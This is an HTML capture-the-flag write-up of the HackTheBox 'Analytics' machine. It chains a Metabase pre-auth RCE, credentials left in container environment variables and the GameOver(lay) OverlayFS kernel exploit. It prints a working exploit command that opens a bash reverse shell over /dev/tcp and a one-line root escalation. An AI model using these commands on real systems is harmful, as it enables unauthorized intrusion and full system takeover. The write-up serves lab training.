@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Analytics &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Analytics</h1>
+    <div class="meta">Target: <code>10.10.14.92</code></div>
+    <div class="tags"><span class="tag">CVE</span><span class="tag">Linux</span><span class="tag">RCE</span><span class="tag">Metabase</span><span class="tag">GameOverlay</span><span class="tag">KernelExploit</span><span class="tag">SubdomainEnum</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#metabase-pre-auth-rce-cve-2023-38646">Metabase Pre-Auth RCE (CVE-2023-38646)</a><a class="lvl3" href="#credentials-in-the-environment">Credentials in the Environment</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#gameover-lay-cve-2023-2640-cve-2023-32629">GameOver(lay), CVE-2023-2640 / CVE-2023-32629</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Analytics is an easy Linux box that pairs a pre-auth RCE in a popular BI tool with a headline-grabbing kernel exploit. The foothold is <strong>CVE-2023-38646</strong>, an unauthenticated remote code execution in Metabase that hinges on a leaked setup token. From a shell as the <code>metabase</code> service account, environment variables hand over real user credentials, and the box finishes with <strong>GameOver(lay)</strong> (CVE-2023-2640 / CVE-2023-32629), an Ubuntu-specific OverlayFS flaw that turns any local user into root in a single command.</p>
+<h2 id="recon">Recon</h2>
+<p>The web root redirects to a vhost, so the first move is fixing name resolution:</p>
+<pre><code>analytical.htb -&gt; /etc/hosts
+</code></pre>
+<p>The site's "Login" link then points at another subdomain:</p>
+<pre><code>http://data.analytical.htb/
+</code></pre>
+<p>Adding that to hosts too lands on a <strong>Metabase</strong> login page.</p>
+<blockquote>
+<p><strong>Why vhost enumeration matters:</strong> a single IP can serve many sites keyed on the <code>Host</code> header. The interesting application (Metabase) wasn't on the apex domain at all, it lived on <code>data.</code> Miss the redirect and you miss the whole box.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="metabase-pre-auth-rce-cve-2023-38646">Metabase Pre-Auth RCE (CVE-2023-38646)</h3>
+<p>Metabase exposes a setup token at an unauthenticated API endpoint, and that token is the key to the exploit:</p>
+<pre><code>GET /api/session/properties   -&gt;   &quot;setup-token&quot;: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
+</code></pre>
+<blockquote>
+<p><strong>How the bug works:</strong> during first-time setup, Metabase lets you validate a database connection. The connection string accepts an H2 JDBC URL with an <code>INIT=</code> clause, which runs arbitrary SQL/Java on connect. Because the setup token is readable pre-auth, an attacker can replay the "test connection" flow long after setup and smuggle in a command, no login required.</p>
+</blockquote>
+<p>I used <a href="https://github.com/m3m0o/metabase-pre-auth-rce-poc">m3m0o's PoC</a>, passing the token, target, and a bash reverse shell:</p>
+<pre><code class="language-sh">python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.92/53 0&gt;&amp;1&quot;
+[+] Payload sent
+</code></pre>
+<p>I confirmed execution first with a curl callback to my HTTP server. <code>busybox nc</code> and a downloaded <code>nc</code> binary both failed in the container, but a bare <code>bash -i</code> reverse shell over port 53 connected as <code>metabase</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+5ac62e96742d:/$ whoami
+metabase
+</code></pre>
+<h3 id="credentials-in-the-environment">Credentials in the Environment</h3>
+<p>This is a container, so I checked the process environment, services frequently get their secrets injected there:</p>
+<pre><code>META_USER=metalytics
+META_PASS=‹redacted›
+</code></pre>
+<p>Those credentials worked over SSH, moving me from the container service account to a real user:</p>
+<pre><code class="language-sh">metalytics@analytics:~$ whoami
+metalytics
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="gameover-lay-cve-2023-2640-cve-2023-32629">GameOver(lay), CVE-2023-2640 / CVE-2023-32629</h3>
+<p>Checking the kernel revealed a vulnerable Ubuntu build:</p>
+<pre><code>6.2.0-25-generic #25-22.04.2-Ubuntu
+</code></pre>
+<blockquote>
+<p><strong>What GameOver(lay) is:</strong> Ubuntu carried downstream patches to OverlayFS that mishandled file capabilities. By crafting an overlay mount where the upper layer copies a binary up with attacker-controlled capabilities, an unprivileged user can set <code>cap_setuid</code> on their own copy of <code>python3</code>. That capability then lets the process call <code>setuid(0)</code> and become root. It's a local privesc that needs no compiler and no credentials, just an affected kernel.</p>
+</blockquote>
+<p>The whole escalation is one line: build the overlay, copy up <code>python3</code> with <code>cap_setuid</code>, then use it to drop to UID 0:</p>
+<pre><code class="language-sh">unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c 'import os;os.setuid(0);os.system(&quot;rm -rf l m u w; bash&quot;)'
+
+root@analytics:~# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Both flags read; box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Always follow redirects and enumerate vhosts.</strong> The vulnerable app was on a subdomain, invisible from the apex.</li>
+<li><strong>CVE-2023-38646 only needs the setup token</strong>, which Metabase leaks pre-auth, a reminder to patch BI tooling promptly.</li>
+<li><strong>Containers leak secrets in <code>env</code>.</strong> Service credentials there bridged from a throwaway container shell to a real SSH user.</li>
+<li><strong>GameOver(lay) is a near-universal Ubuntu privesc</strong> for unpatched 2023-era kernels, check <code>uname -r</code> early.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
